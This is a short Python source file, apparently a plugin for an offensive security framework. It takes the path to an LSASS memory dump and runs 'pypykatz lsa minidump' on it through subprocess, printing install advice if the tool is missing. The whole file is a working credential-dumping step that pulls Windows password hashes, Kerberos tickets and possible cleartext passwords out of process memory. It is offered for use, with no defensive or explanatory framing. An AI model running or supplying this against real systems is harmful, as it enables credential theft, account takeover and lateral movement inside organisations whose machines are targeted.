def run(data, cred, args):
    import subprocess
    import os

    dump_file = args.file

    if not os.path.exists(dump_file):
        print(f"[!] File not found: {dump_file}")
        return data

    print(f"[*] Parsing LSASS dump: {dump_file}")
    print(f"[*] Running: pypykatz lsa minidump {dump_file}\n")

    try:
        subprocess.run(
            ["pypykatz", "lsa", "minidump", dump_file],
            check=False
        )
    except FileNotFoundError:
        print("[!] pypykatz not found. Install it with: pip install pypykatz")

    return data